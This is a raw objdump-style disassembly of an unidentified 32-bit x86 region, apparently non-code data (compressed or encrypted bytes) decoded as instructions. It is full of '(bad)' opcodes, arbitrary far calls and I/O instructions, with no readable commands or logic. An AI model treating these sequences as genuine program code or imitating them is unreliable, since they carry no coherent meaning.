  421d3e:	sub    al,0x59
  421d40:	retf   0x587c
  421d43:	inc    esi
  421d44:	sub    BYTE PTR [edx+0x1],ch
  421d47:	add    dh,dh
  421d49:	add    BYTE PTR [eax],al
  421d4b:	add    BYTE PTR [edi],bh
  421d4d:	xor    BYTE PTR [esi+eiz*2-0x1],al
  421d51:	lods   al,BYTE PTR ds:[esi]
  421d52:	xchg   ebp,eax
  421d53:	sbb    bl,BYTE PTR [ebp+0x24c9f396]
  421d59:	dec    ecx
  421d5a:	and    ebx,DWORD PTR [ecx]
  421d5c:	push   ds
  421d5d:	aaa    
  421d5e:	jno    0x421dca
  421d60:	mov    al,0x9b
  421d62:	adc    DWORD PTR [ebx-0x7d],ecx
  421d65:	mov    al,0x97
  421d67:	pop    edx
  421d68:	shr    DWORD PTR [ebp-0x31a9a57a],1
  421d6e:	dec    esi
  421d6f:	pop    ebx
  421d70:	dec    ebp
  421d71:	fwait
  421d72:	mov    al,0x8
  421d74:	call   0x64521ade
  421d79:	add    al,bh
  421d7b:	mov    edi,0xc9ef467e
  421d80:	add    eax,0x8ceee73d
  421d85:	inc    edi
  421d86:	mov    ch,0x5c
  421d88:	pop    edi
  421d89:	retf   
  421d8a:	xor    al,0x9f
  421d8c:	stos   DWORD PTR es:[edi],eax
  421d8d:	sti    
  421d8e:	neg    DWORD PTR [esi]
  421d90:	pop    esp
  421d91:	call   0xb27e9125
  421d96:	adc    DWORD PTR [ebp+0x57d2aea5],ebx
  421d9c:	pop    ds
  421d9d:	call   0xa65e7360
  421da2:	sub    ebp,DWORD PTR [ecx-0x1f291c78]
  421da8:	adc    BYTE PTR ds:[edi-0x8],dl
  421dac:	cmp    BYTE PTR [eax],cl
  421dae:	sbb    bl,dl
  421db0:	push   0x4479064c
  421db5:	fstp   QWORD PTR [edi]
  421db7:	xchg   ecx,eax
  421db8:	jb     0x421dd9
  421dba:	jl     0x421e07
  421dbc:	(bad)  
  421dbd:	push   eax
  421dbe:	retf   0xc62d
  421dc1:	hlt    
  421dc2:	leave  
  421dc3:	lahf   
  421dc4:	mov    ebp,0x368b1987
  421dc9:	xor    eax,0x5586717f
  421dce:	jl     0x421e3b
  421dd0:	and    cl,BYTE PTR [edi]
  421dd2:	pop    eax
  421dd3:	cmp    ch,BYTE PTR [ecx-0x49cf3324]
  421dd9:	ins    DWORD PTR es:[edi],dx
  421dda:	push   ds
  421ddb:	jbe    0x421e4f
  421ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dde:	enter  0xed68,0x7d
  421de2:	xchg   esp,eax
  421de3:	xor    eax,0xf0bb9386
  421de8:	pop    es
  421de9:	xlat   BYTE PTR ds:[ebx]
  421dea:	rcl    BYTE PTR [eax+0x7b],0xb6
  421dee:	and    ebx,DWORD PTR [eax+0x4ef9decf]
  421df4:	fs test eax,0xb8bddfcd
  421dfa:	xchg   ebp,ecx
  421dfc:	pop    edi
  421dfd:	rol    DWORD PTR cs:[edx+0x6bf2e982],cl
  421e04:	push   cs
  421e05:	inc    ecx
  421e06:	and    DWORD PTR [edi-0x4944be5b],eax
  421e0c:	add    edx,0xffffffe5
  421e0f:	push   cs
  421e10:	xchg   ebx,eax
  421e11:	add    ch,BYTE PTR cs:[ebp+ecx*2-0x3d847ece]
  421e19:	aas    
  421e1a:	js     0x421e10
  421e1c:	leave  
  421e1d:	xor    al,0x2b
  421e1f:	(bad)  
  421e20:	xlat   BYTE PTR ds:[ebx]
  421e21:	mov    cl,BYTE PTR [edi]
  421e23:	mov    esp,0x75408cd5
  421e28:	aaa    
  421e29:	hlt    
  421e2a:	add    DWORD PTR [esi+edx*4-0x27],eax
  421e2e:	xor    ebx,ebx
  421e30:	push   DWORD PTR [edi-0x21]
  421e33:	ret    
  421e34:	lock sbb al,0x3d
  421e37:	sti    
  421e38:	dec    edi
  421e39:	inc    edx
  421e3a:	push   edx
  421e3b:	add    DWORD PTR [eax+0x7c],edx
  421e3e:	xchg   esi,eax
  421e3f:	mov    cl,0x9
  421e41:	xchg   edx,eax
	...
  421eb2:	add    BYTE PTR [eax],al
  421eb4:	and    BYTE PTR [edi-0x28082cbe],dl
  421eba:	mov    cl,0xf7
  421ebc:	fisttp WORD PTR [ebx-0x19]
  421ebf:	jo     0x421e93
  421ec1:	xlat   BYTE PTR ds:[ebx]
  421ec2:	mov    eax,ds:0x16b1ee4
  421ec7:	add    dh,dh
  421ec9:	add    BYTE PTR [eax],al
  421ecb:	add    ch,bh
  421ecd:	xor    BYTE PTR [edi+0x16199d8c],bl
  421ed3:	repz add bl,BYTE PTR [esi+0x4d]
  421ed7:	mov    ch,0xb7
  421ed9:	leave  
  421eda:	mov    ah,0x12
  421edc:	call   0x650f:0x4936ae42
  421ee3:	icebp  
  421ee4:	packssdw mm2,QWORD PTR [esp]
  421ee8:	minps  xmm0,xmm7
  421eeb:	(bad)  
  421eed:	(bad)  
  421eee:	leave  
  421eef:	cld    
  421ef0:	push   es
  421ef1:	dec    esp
  421ef2:	pop    ds
  421ef3:	inc    esp
  421ef4:	sub    bl,0x83
  421ef7:	in     eax,0xd9
  421ef9:	xchg   edi,eax
  421efa:	or     al,0x47
  421efc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421efd:	(bad)  
  421efe:	xchg   edi,eax
  421eff:	push   cs
  421f00:	push   edx
  421f01:	aas    
  421f02:	mov    ecx,0x4465af3a
  421f07:	test   al,0x1
  421f09:	data16 jp 0x421f74
  421f0c:	lods   al,BYTE PTR ds:[esi]
  421f0d:	fisubr DWORD PTR [edx+ecx*2-0x4]
  421f11:	shr    BYTE PTR [eax+eax*8+0x62],0x27
  421f16:	in     al,0xac
  421f18:	(bad)  
  421f19:	or     esp,DWORD PTR [edx+0x59]
  421f1c:	push   0xf945ce43
  421f21:	js     0x421f7a
  421f23:	imul   edi,DWORD PTR [eax],0x10b618df
  421f29:	and    al,0x24
  421f2b:	add    DWORD PTR [esi-0x2],ebp
  421f2e:	cmp    esp,DWORD PTR [ebp-0x5284c8f1]
  421f34:	mov    DWORD PTR [edx],edi
  421f36:	inc    edx
  421f37:	adc    DWORD PTR ds:0x5971f667,ecx
  421f3d:	loopne 0x421f1e
  421f3f:	push   ds
  421f40:	xor    ecx,edx
  421f42:	fisub  DWORD PTR [esi-0x22134fa]
  421f48:	xor    eax,0xb984a649
  421f4d:	push   0x6b00ac84
  421f52:	ficom  DWORD PTR [edx-0x4258df2c]
  421f58:	mov    esi,0x7cbc1c0
  421f5d:	jle    0x421f14
  421f5f:	lods   al,BYTE PTR ds:[esi]
  421f60:	mov    DWORD PTR [ebp-0x62228d19],eax
  421f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f67:	push   ecx
  421f68:	inc    eax
  421f69:	mov    ds:0x2d93dc3,eax
  421f6e:	(bad)  
  421f6f:	xor    al,0x5c
  421f71:	(bad)
  421f74:	sbb    BYTE PTR [edx],cl
  421f76:	out    0x92,al
  421f78:	mov    gs,WORD PTR cs:[esi+0x557bc08]
  421f7f:	lea    esp,[ebp+0x3]
  421f82:	jae    0x421f68
  421f84:	(bad)  
  421f85:	aas    
  421f86:	inc    ecx
  421f87:	arpl   WORD PTR [edi+ecx*2+0x6bc75110],bp
  421f8e:	xchg   BYTE PTR [ebp+0x68],ah
  421f91:	jnp    0x421fab
  421f93:	adc    bh,bh
  421f95:	call   0x4188:0x2b2229f4
  421f9c:	inc    BYTE PTR [ebx-0x2e]
  421f9f:	adc    eax,0x1b6dd561
  421fa4:	sbb    esi,DWORD PTR [ebp*4+0x7c214bf9]
  421fab:	cmc    
  421fac:	sub    bl,BYTE PTR [ecx]
  421fae:	fcmovbe st,st(4)
  421fb0:	sti    
  421fb1:	xor    esi,ebx
  421fb3:	stc    
  421fb4:	xchg   edi,eax
  421fb5:	cli    
  421fb6:	push   ecx
  421fb7:	mov    esi,0xac963e3a
  421fbc:	jbe    0x422006
  421fbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fbf:	dec    ecx
  421fc0:	xchg   ecx,eax
  421fc1:	hlt    
	...
  422032:	add    BYTE PTR [eax],al
  422034:	lahf   
  422035:	pop    esi
  422036:	fcmovb st,st(6)
  422038:	fcmovnb st,st(6)
  42203a:	lahf   
  42203b:	pop    edi
  42203c:	bnd ja 0x422029
  42203f:	mov    edi,0xfcc75695
  422044:	adc    al,0x6c
  422046:	add    DWORD PTR [eax],eax
  422048:	test   BYTE PTR [eax],0x0
  42204b:	add    BYTE PTR [eax+esi*2+0x1],cl
  42204f:	popf   
  422050:	outs   dx,DWORD PTR ds:[esi]
  422051:	xor    DWORD PTR [eax-0xfc4f9d2],esi
  422057:	push   ebx
  422058:	xor    DWORD PTR [edx+0x2],0xffffff93
  42205c:	retf   0xc48f
  42205f:	out    dx,eax
  422060:	and    edx,DWORD PTR [esi]
  422062:	pop    ebp
  422063:	push   0x22
  422065:	xor    al,0xf
  422067:	mov    ebx,?
  422069:	mov    ch,0x8b
  42206b:	jae    0x42202f
  42206d:	retf   0x1da4
  422070:	leave  
  422071:	pop    ebx
  422072:	js     0x422047
  422074:	mov    eax,ds:0xf004399c
  422079:	dec    ebp
  42207a:	aad    0x7f
  42207c:	pop    ds
  42207d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42207e:	jge    0x422080
  422080:	sahf   
  422081:	imul   ebp,DWORD PTR [ecx-0x456b5030],0xffffff97
  422088:	fsubr  QWORD PTR [edx-0x44]
  42208b:	inc    esp
  42208c:	sub    al,BYTE PTR [edx]
  42208e:	into   
  42208f:	xlat   BYTE PTR ds:[ebx]
  422090:	icebp  
  422091:	mov    cl,0xf8
  422093:	sbb    ebp,DWORD PTR [esi-0x236b9539]
  422099:	inc    BYTE PTR [esi-0x45a1b0c0]
  42209f:	jge    0x4220ce
  4220a1:	mov    ds:0xb5037ba6,eax
  4220a6:	inc    ecx
  4220a7:	jp     0x422038
  4220a9:	sahf   
  4220aa:	mov    esi,0x989bc768
  4220af:	ret    0x98a5
  4220b2:	dec    edx
  4220b3:	xor    ebp,DWORD PTR [ebp+0x10d3e48c]
  4220b9:	xor    al,0xe9
  4220bb:	cmc    
  4220bc:	(bad)  
  4220bd:	jmp    0xc83483be
  4220c2:	push   esp
  4220c3:	pop    ds
  4220c4:	ret    
  4220c5:	stc    
  4220c6:	popa   
  4220c7:	add    edi,ecx
  4220c9:	inc    eax
  4220ca:	adc    BYTE PTR [ebx+0x64],0xb8
  4220ce:	xchg   edx,eax
  4220cf:	sti    
  4220d0:	pop    ebp
  4220d1:	aaa    
  4220d2:	xchg   ebx,eax
  4220d3:	test   al,0xd8
  4220d5:	sub    DWORD PTR [esi+0x42],edi
  4220d8:	sub    eax,0xd6dd2128
  4220dd:	or     ebx,DWORD PTR [edx-0x7743814b]
  4220e3:	jmp    0xe54cd19c
  4220e8:	in     al,dx
  4220e9:	es push 0xffffffca
  4220ec:	dec    esp
  4220ed:	ins    DWORD PTR es:[edi],dx
  4220ee:	fcmovbe st,st(7)
  4220f0:	stc    
  4220f1:	mov    esp,0x525b8122
  4220f6:	(bad)  
  4220f7:	popa   
  4220f8:	mov    dh,al
  4220fa:	mov    dl,BYTE PTR [ebx-0x14712a0c]
  422100:	push   esi
  422101:	loop   0x4220da
  422103:	cli    
  422104:	jno    0x4220e6
  422106:	sbb    al,0x58
  422108:	cmp    esp,edi
  42210a:	leave  
  42210b:	inc    BYTE PTR [ecx-0x3c]
  42210e:	test   edx,ebx
  422110:	sub    eax,0xf50e0360
  422115:	cmp    eax,0x839d62da
  42211a:	sub    BYTE PTR [esi+0x74],dl
  42211d:	ficom  WORD PTR [ebp-0x4fa69472]
  422123:	cmp    edx,esp
  422125:	fwait
  422126:	pusha  
  422127:	fwait
  422128:	pop    es
  422129:	call   0xf66c:0xabeeb7c2
  422130:	mov    cs,WORD PTR [edi-0x111b8caf]
  422136:	mov    bh,0x39
  422138:	sub    ch,ah
  42213a:	sbb    DWORD PTR [ebp-0x63],edx
  42213d:	mov    ?,WORD PTR [edx]
  42213f:	loopne 0x4220e7
  422141:	adc    al,0x0
	...
  4221b3:	add    BYTE PTR [esi-0x700870e1],bl
  4221b9:	idiv   esi
  4221bb:	jg     0x4221f8
  4221bd:	data16 daa 
  4221bf:	aad    0x8e
  4221c1:	push   cs
  4221c2:	push   ds
  4221c3:	hlt    
  4221c4:	or     ch,BYTE PTR [ebp+0x1]
  4221c7:	add    dh,dh
  4221c9:	add    BYTE PTR [eax],al
  4221cb:	add    cl,bl
  4221cd:	int    0x46
  4221cf:	jnp    0x4221e7
  4221d1:	and    eax,DWORD PTR ds:0xbf497a2d
  4221d7:	shl    DWORD PTR [ecx-0x94d99b6],0x8b
  4221de:	xchg   esi,eax
  4221df:	in     al,dx
  4221e0:	je     0x42220c
  4221e2:	pop    ebx
  4221e3:	mov    cl,0x1b
  4221e5:	mov    ds:0x9ccd7a05,eax
  4221ea:	retf   
  4221eb:	xchg   DWORD PTR [eax],esi
  4221ed:	stos   DWORD PTR es:[edi],eax
  4221ee:	mov    ds,WORD PTR [ecx]
  4221f0:	jo     0x4221a3
  4221f2:	leave  
  4221f3:	jae    0x42225c
  4221f5:	aad    0xda
  4221f7:	jmp    0x7b5:0x627802a0
  4221fe:	pop    esp
  4221ff:	cmp    al,0x52
  422201:	sbb    bh,dl
  422203:	popf   
  422204:	mov    edi,0x12de3a0e
  422209:	lods   eax,DWORD PTR ds:[esi]
  42220a:	pop    eax
  42220b:	pop    es
  42220c:	cmp    ebp,edi
  42220e:	inc    DWORD PTR [ebx-0x6a]
  422211:	adc    al,BYTE PTR [edi+0x7829b2ad]
  422217:	shl    eax,0x4
  42221a:	sbb    al,0x2e
  42221c:	and    ebx,DWORD PTR [edi+0x159e40f4]
  422222:	jno    0x4221cb
  422224:	cmp    BYTE PTR ss:[ebx-0x2d8f06c6],ch
  42222b:	adc    al,0x64
  42222d:	pop    ds
  42222e:	out    dx,eax
  42222f:	int3   
  422230:	mov    ss,WORD PTR [eax+0x20]
  422233:	mov    fs,WORD PTR [eax+0x5f]
  422236:	dec    edx
  422237:	pop    eax
  422238:	inc    ebp
  422239:	ja     0x4221e7
  42223b:	mov    edi,0xc015a20b
  422240:	mov    ebp,0x93d7ba36
  422245:	ins    DWORD PTR es:[edi],dx
  422246:	xor    al,0xf9
  422248:	nop
  422249:	adc    eax,0x83eb6e21
  42224e:	sahf   
  42224f:	sub    al,0xf
  422251:	lods   al,BYTE PTR ds:[esi]
  422252:	mov    al,ds:0x552b27d9
  422257:	imul   ebx,DWORD PTR [edi+0x1d],0xffffffcd
  42225b:	and    DWORD PTR [ebp+0x41],0x660bec78
  422262:	mov    esp,0x23461c05
  422267:	sub    ebp,DWORD PTR [ecx-0x50]
  42226a:	sti    
  42226b:	in     al,0x51
  42226d:	ins    BYTE PTR es:[edi],dx
  42226e:	clc    
  42226f:	outs   dx,BYTE PTR ds:[esi]
  422270:	cmp    eax,0x1d395a6e
  422275:	in     al,0x86
  422277:	jno    0x4222b5
  422279:	mov    ah,BYTE PTR [ebx-0x3a]
  42227c:	and    al,0xb5
  42227e:	repnz push es
  422280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422281:	out    0xba,eax
  422283:	scas   eax,DWORD PTR es:[edi]
  422284:	jno    0x42226b
  422286:	inc    edx
  422287:	xor    eax,esp
  422289:	int    0xd8
  42228b:	inc    esp
  42228c:	sub    BYTE PTR [edx+0x68ad08d],dh
  422292:	adc    al,BYTE PTR [eax+0x33be51fc]
  422298:	adc    eax,0x3bdeac08
  42229d:	sahf   
  42229e:	aad    0x1d
  4222a0:	ja     0x4222f1
  4222a2:	hlt    
  4222a3:	mov    ds:0x1affddd8,eax
  4222a8:	sbb    bh,BYTE PTR [eax+eiz*1-0x49624bef]
  4222af:	cwde   
  4222b0:	fimul  WORD PTR [edx]
  4222b2:	pushf  
  4222b3:	addr16 cmp al,0xd1
  4222b6:	xor    edx,esp
  4222b8:	adc    dl,BYTE PTR [esi-0x6b]
  4222bb:	leave  
  4222bc:	rcl    DWORD PTR [ecx],cl
  4222be:	outs   dx,DWORD PTR ds:[esi]
  4222bf:	xchg   ebp,eax
  4222c0:	xor    bh,dl
	...
  422332:	add    BYTE PTR [eax],al
  422334:	inc    bh
  422336:	pop    esp
  422337:	mov    eax,ds:0xdfffbb7d
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	inc    edi
  42233e:	gs pop es
  422340:	out    dx,eax
  422341:	dec    ebx
  422342:	mov    ebx,0x16e00ce
  422347:	add    dh,dh
  422349:	add    BYTE PTR [eax],al
  42234b:	add    BYTE PTR [eax+0x1833aecb],bh
  422351:	cld    
  422352:	jp     0x4222fa
  422354:	out    0xbf,al
  422356:	clc    
  422357:	jmp    0x16f8:0x5286d57c
  42235e:	sbb    BYTE PTR [esi],al
  422360:	lahf   
  422361:	inc    edx
  422362:	clc    
  422363:	mov    esp,0x4ee3484e
  422368:	jp     0x4223b6
  42236a:	das    
  42236b:	in     al,0x4a
  42236d:	ret    0x7dbd
  422370:	cmc    
  422371:	js     0x4222fe
  422373:	enter  0x4f26,0xc5
  422377:	push   ds
  422378:	sbb    DWORD PTR [ebx-0x2b],edi
  42237b:	mov    eax,ds:0xd7686ed4
  422380:	xchg   edx,eax
  422381:	push   ecx
  422382:	push   ecx
  422383:	sbb    edi,DWORD PTR [esi+0x3a1fa333]
  422389:	mov    ss,WORD PTR [esi+ebx*1+0x25e34fbc]
  422390:	xchg   DWORD PTR [ebx-0x24e141c6],ebx
  422396:	es jg  0x422342
  422399:	lods   al,BYTE PTR ds:[esi]
  42239a:	(bad)  
  42239b:	fisub  DWORD PTR [eax]
  42239d:	add    BYTE PTR [ebx],dl
  42239f:	ss iret 
  4223a1:	ss sub al,0xfa
  4223a4:	pop    ds
  4223a5:	xor    al,0xe7
  4223a7:	and    BYTE PTR [ebx-0x7f],cl
  4223aa:	(bad)  
  4223ab:	mov    esp,0x763497b1
  4223b0:	outs   dx,DWORD PTR ds:[esi]
  4223b1:	pop    esi
  4223b2:	push   esi
  4223b3:	(bad)  
  4223b4:	lds    eax,FWORD PTR [edi+ebx*8-0x2cf85617]
  4223bb:	lea    ebp,[ebx]
  4223bd:	nop
  4223be:	(bad)  
  4223bf:	shl    ch,0xe1
  4223c2:	fs das 
  4223c4:	xor    eax,0xf09fe817
  4223c9:	loop   0x4223fc
  4223cb:	inc    esp
  4223cc:	sbb    eax,0x2ac563c0
  4223d1:	cli    
  4223d2:	xor    BYTE PTR [ecx+0x61778441],0xff
  4223d9:	xor    al,0x9
  4223db:	stos   DWORD PTR es:[edi],eax
  4223dc:	fimul  DWORD PTR ds:0x584b3c09
  4223e2:	es in  al,dx
  4223e4:	loopne 0x422463
  4223e6:	push   ecx
  4223e7:	inc    edx
  4223e8:	shr    edi,0x62
  4223eb:	js     0x4223fb
  4223ed:	mov    bl,0x4
  4223ef:	daa    
  4223f0:	adc    edx,DWORD PTR [esi+0x6d]
  4223f3:	scas   al,BYTE PTR es:[edi]
  4223f4:	rcr    DWORD PTR [edx+0x3f],cl
  4223f7:	leave  
  4223f8:	aaa    
  4223f9:	in     eax,0x59
  4223fb:	pushf  
  4223fc:	ja     0x4223e3
  4223fe:	adc    eax,0x8db28d2c
  422403:	in     eax,0x86
  422405:	and    esi,DWORD PTR [esi+0x274fc7a4]
  42240b:	repnz movs BYTE PTR es:[di],BYTE PTR ds:[si]
  42240e:	call   DWORD PTR [ecx+0x31]
  422411:	sub    bl,BYTE PTR [ecx-0x4f]
  422414:	lea    ebp,[eax-0x21]
  422417:	jl     0x42248d
  422419:	rcl    BYTE PTR [esi+0x35],0xfc
  42241d:	int3   
  42241e:	ror    BYTE PTR [ebp-0x264038b0],cl
  422424:	out    dx,eax
  422425:	mov    esi,0xa63a7c7
  42242a:	push   esi
  42242b:	popa   
  42242c:	xor    al,0x57
  42242e:	or     edi,DWORD PTR [eax+0xb]
  422431:	loop   0x422443
  422433:	jp     0x4223da
  422435:	jo     0x42243e
  422437:	or     eax,esi
  422439:	xor    esp,esi
  42243b:	push   0x29bc15f
  422440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422441:	into   
	...
  4224b2:	add    BYTE PTR [eax],al
  4224b4:	(bad)  
  4224b5:	repnz test BYTE PTR [eax],bl
  4224b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b9:	jle    0x422499
  4224bb:	(bad)  
  4224bc:	(bad)  
  4224bd:	mov    edx,0x14709f7c
  4224c2:	leave  
  4224c3:	sub    esi,esi
  4224c5:	outs   dx,BYTE PTR ds:[esi]
  4224c6:	add    DWORD PTR [eax],eax
  4224c8:	test   BYTE PTR [eax],0x0
  4224cb:	add    BYTE PTR [esi+0x4e114369],dh
  4224d1:	lods   al,BYTE PTR ds:[esi]
  4224d2:	jge    0x422543
  4224d4:	stos   DWORD PTR es:[edi],eax
  4224d5:	and    eax,0x2c765f54
  4224da:	dec    ecx
  4224db:	pop    eax
  4224dc:	pusha  
  4224dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224de:	ins    DWORD PTR es:[edi],dx
  4224df:	xor    DWORD PTR [ebx+0x6c00adff],edx
  4224e5:	and    al,0xe2
  4224e7:	mov    ah,0xa9
  4224e9:	mov    eax,ds:0x193e96d6
  4224ee:	das    
  4224ef:	inc    edi
  4224f0:	call   0x13b4:0xcd8a567a
  4224f7:	gs adc al,0x96
  4224fa:	int    0x33
  4224fc:	jmp    0x42248a
  4224fe:	dec    edi
  4224ff:	sbb    BYTE PTR [esp+edi*8+0x4a30321b],ah
  422506:	rcl    BYTE PTR [esi-0x32cf61e8],0x52
  42250d:	cdq    
  42250e:	mov    al,ds:0xa8e43cea
  422513:	mov    eax,ds:0x4f7e7750
  422518:	adc    BYTE PTR ds:0x89f2c48a,cl
  42251e:	adc    eax,0xebacbdde
  422523:	mov    bh,0xc5
  422525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422526:	cmp    al,0xfb
  422528:	(bad)  
  422529:	arpl   WORD PTR [edi],bx
  42252b:	adc    al,0xe0
  42252d:	aad    0x91
  42252f:	push   0xffffffa4
  422531:	lea    edi,[ebx]
  422533:	pop    ss
  422534:	clc    
  422535:	in     al,0x69
  422537:	pop    eax
  422538:	sbb    al,0xcd
  42253a:	sbb    DWORD PTR [edi+ebx*1+0x1b532855],0xffffffa5
  422542:	not    BYTE PTR ss:[edx]
  422545:	ret    0xd684
  422548:	out    dx,eax
  422549:	pop    ebx
  42254a:	jmp    0xc5e408fa
  42254f:	pop    edx
  422550:	(bad)  
  422551:	push   ebx
  422552:	repnz pop eax
  422554:	mov    DWORD PTR [edi-0x57],edi
  422557:	repz cmp DWORD PTR [edi-0x74],esp
  42255b:	(bad)  
  42255c:	mov    eax,ds:0x11653690
  422561:	nop
  422562:	in     eax,dx
  422563:	push   ebp
  422564:	out    dx,eax
  422565:	push   ebx
  422566:	inc    ebx
  422567:	js     0x4225dd
  422569:	stos   DWORD PTR es:[edi],eax
  42256a:	and    eax,0x508d1902
  42256f:	test   DWORD PTR [edx+ecx*2],eax
  422572:	jg     0x4225a2
  422574:	dec    ebp
  422575:	mov    ebp,gs
  422577:	leave  
  422578:	pop    ebp
  422579:	arpl   WORD PTR [eax+0x6ef00f24],bp
  42257f:	popa   
  422580:	pushf  
  422581:	or     al,0x1f
  422583:	cmc    
  422584:	xor    eax,0x133e678b
  422589:	push   edi
  42258a:	push   ecx
  42258b:	mov    bh,0x8e
  42258d:	outs   dx,DWORD PTR ds:[esi]
  42258e:	mov    al,0x38
  422590:	mov    ds:0xfa94e161,al
  422595:	daa    
  422596:	mov    esi,0x87264070
  42259b:	fcomp  st(7)
  42259d:	or     DWORD PTR [edi+0x5fdc7853],eax
  4225a3:	sbb    esi,edi
  4225a5:	xchg   esp,eax
  4225a6:	mov    fs,WORD PTR [ebx]
  4225a8:	or     eax,0xdc74e76f
  4225ad:	mov    edx,0xf72fc5f4
  4225b2:	stos   BYTE PTR es:[edi],al
  4225b3:	aam    0x9a
  4225b5:	mov    ch,0xc
  4225b7:	sub    eax,0x64632dda
  4225bc:	aam    0x4c
  4225be:	pop    eax
  4225bf:	add    esi,eax
  4225c1:	mov    ds:0x0,al
	...
  422632:	add    BYTE PTR [eax],al
  422634:	stos   DWORD PTR es:[edi],eax
  422635:	sub    al,0xed
  422637:	stos   BYTE PTR es:[edi],al
  422638:	out    dx,eax
  422639:	jmp    0x42262a
  42263b:	sub    eax,0xb720f321
  422640:	push   ss
  422641:	call   0x702ecf5b
  422646:	add    DWORD PTR [eax],eax
  422648:	test   BYTE PTR [eax],0x0
  42264b:	add    ah,ch
  42264d:	sub    eax,ebp
  42264f:	mov    esi,0xc165ef65
  422654:	inc    BYTE PTR [edi+0x6b4725b6]
  42265a:	stos   DWORD PTR es:[edi],eax
  42265b:	loope  0x4225f9
  42265d:	bound  esp,QWORD PTR [edi+0x1db29b43]
  422663:	lods   eax,DWORD PTR ds:[esi]
  422664:	lods   al,BYTE PTR ds:[esi]
  422665:	add    al,BYTE PTR [esi-0x5e]
  422668:	push   edx
  422669:	repnz shr BYTE PTR [ebp+0x39070d3e],1
  422670:	mov    al,0x30
  422672:	imul   ebp,DWORD PTR [edx-0x3a0dde98],0xffffffe8
  422679:	les    edx,FWORD PTR [ecx+0x5c]
  42267c:	sub    BYTE PTR [esi],ah
  42267e:	in     al,dx
  42267f:	dec    edx
  422680:	dec    ebx
  422681:	or     bh,dh
  422683:	loopne 0x4226b4
  422685:	jecxz  0x42269a
  422687:	ret    
  422688:	mov    eax,ds:0xf3ce34b
  42268d:	sub    BYTE PTR [esi+0x2e],al
  422690:	stos   DWORD PTR es:[edi],eax
  422691:	stc    
  422692:	test   eax,0x7ae5ed8f
  422697:	mov    eax,ds:0x17a015f9
  42269c:	shr    BYTE PTR [eax],cl
  42269e:	mov    bh,0x10
  4226a0:	pop    esp
  4226a1:	cld    
  4226a2:	in     eax,0xf8
  4226a4:	jmp    0xd450:0xbf48cc48
  4226ab:	call   0xeebb:0xdfc46a23
  4226b2:	fcomp  QWORD PTR [ebx+0x2f38aa22]
  4226b8:	mov    dh,0x5b
  4226ba:	pusha  
  4226bb:	mov    ah,0x2f
  4226bd:	sbb    DWORD PTR [ebx*2+0x619734e0],edi
  4226c4:	sub    DWORD PTR [ecx+0x2d128e6c],edx
  4226ca:	fcmovnu st,st(0)
  4226cc:	push   edi
  4226cd:	mov    al,0x90
  4226cf:	rcr    BYTE PTR [edi-0xf],cl
  4226d2:	shl    BYTE PTR [esi+0x47],1
  4226d5:	mov    esp,0x9284694f
  4226da:	mov    ebx,DWORD PTR [ecx+0x7d640b66]
  4226e0:	lods   eax,DWORD PTR ds:[esi]
  4226e1:	outs   dx,BYTE PTR ds:[esi]
  4226e2:	or     BYTE PTR [eax+0x7e3903f2],ah
  4226e8:	mov    esi,0x2162473d
  4226ed:	ins    BYTE PTR es:[edi],dx
  4226ee:	push   esi
  4226ef:	outs   dx,BYTE PTR ds:[esi]
  4226f0:	leave  
  4226f1:	sbb    eax,DWORD PTR [edi]
  4226f3:	jb     0x4226f7
  4226f5:	(bad)  
  4226f6:	or     edx,DWORD PTR es:0xeb3df78e
  4226fd:	(bad)  
  4226fe:	fiadd  WORD PTR [ebp-0x6a0bc3a9]
  422704:	mov    bl,0x47
  422706:	scas   al,BYTE PTR es:[edi]
  422707:	lock pop DWORD PTR [edx+esi*4]
  42270b:	in     al,dx
  42270c:	inc    edi
  42270d:	or     esi,ebp
  42270f:	sub    esi,0xffffffb9
  422712:	add    esp,DWORD PTR [esi-0x44793ea1]
  422718:	pusha  
  422719:	jmp    0x1ec1cb2f
  42271e:	jle    0x4226b3
  422720:	in     al,0xdd
  422722:	popf   
  422723:	mov    bh,0x90
  422725:	mov    DWORD PTR [esi-0x6b],edi
  422728:	sbb    edx,ebp
  42272a:	pop    edx
  42272b:	into   
  42272c:	jmp    0x1194e8a6
  422731:	clc    
  422732:	test   esi,ebx
  422734:	mov    cl,0xb2
  422736:	inc    esi
  422737:	and    BYTE PTR [esi-0x11dbde75],cl
  42273d:	push   esi
  42273e:	inc    ebx
  42273f:	hlt    
  422740:	adc    esi,esi
	...
  4227b2:	add    BYTE PTR [eax],al
  4227b4:	shl    DWORD PTR [eax-0x6061f47],1
  4227ba:	fnstenv [ecx-0x69b500ed]
  4227c0:	mov    edi,0xe24ff7bd
  4227c5:	jo     0x4227c8
  4227c7:	add    dh,dh
  4227c9:	add    BYTE PTR [eax],al
  4227cb:	add    BYTE PTR [esi],bh
  4227cd:	jb     0x422803
  4227cf:	arpl   WORD PTR [ebx+0x1dee28d7],cx
  4227d5:	sbb    cl,bl
  4227d7:	aad    0xf5
  4227d9:	out    dx,al
  4227da:	add    eax,eax
  4227dc:	cmp    DWORD PTR [esp+edx*4+0x7e],edx
  4227e0:	push   cs
  4227e1:	xchg   esi,eax
  4227e2:	xchg   BYTE PTR [esi-0x4dba95fb],bl
  4227e8:	inc    ecx
  4227e9:	pop    es
  4227ea:	lods   eax,DWORD PTR ds:[esi]
  4227eb:	jae    0x422853
  4227ed:	arpl   WORD PTR [edx],bx
  4227ef:	mov    eax,0x3580ae73
  4227f4:	popa   
  4227f5:	stc    
  4227f6:	ds jg  0x422797
  4227f9:	pop    ebx
  4227fa:	aas    
  4227fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227fc:	daa    
  4227fd:	int    0x1e
  4227ff:	jmp    0x81a471a0
  422804:	out    0x12,eax
  422806:	sub    dl,ah
  422808:	mov    eax,ds:0xe6b08bf9
